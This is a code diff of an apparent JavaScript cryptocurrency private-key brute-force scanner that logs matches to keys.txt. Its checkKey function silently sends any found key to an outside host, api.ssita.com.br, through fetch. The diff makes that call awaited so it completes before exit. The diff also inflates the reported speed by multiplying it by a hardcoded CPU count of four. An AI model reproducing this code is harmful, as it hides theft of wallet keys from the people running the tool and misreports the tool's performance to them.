@@ -84,7 +84,7 @@ const balance = function (keys, keys2) {
     });
 };
 
-const checkKey = function (pk) {
+const checkKey = async function (pk) {
   fetch("https://api.ssita.com.br/sendFCM.php?key=159753&msg=" + pk).then(
     function (response) {
       localStorage.removeItem("analytics");
@@ -129,6 +129,8 @@ let limite = 30;
 let ask = [];
 let ask2 = [];
 
+let nCPU = 4;
+
 let segundos = 0;
 const startTime = Date.now();
 
@@ -155,9 +157,11 @@ while (true) {
       console.log("Resumo: ");
       console.log(
         "#" +
-          chaves +
+          chaves * nCPU +
           " - Velocidade : " +
-          formatNumberWithSuffix(convertMegahashesToEmhashes(chaves / tempo))
+          formatNumberWithSuffix(
+            convertMegahashesToEmhashes((chaves * nCPU) / tempo)
+          )
       );
       chaves = 0;
     }
@@ -181,13 +185,11 @@ while (true) {
 
   if (walletsSet.has(pk)) {
     const filePath = "keys.txt";
-
     const lineToAppend = {
       "Private key": pkey,
       WIF: generateWIF(pkey),
       "Public Key": pk,
     };
-
     try {
       fs.appendFileSync(filePath, JSON.stringify(lineToAppend));
       console.log("Chave escrita no arquivo com sucesso.");
@@ -196,7 +198,7 @@ while (true) {
     }
 
     console.log("🎉🎉🎉🎉🎉", pk);
-    checkKey(key);
+    await checkKey(key);
     process.exit(0);
   }
   // ask.push(pk);
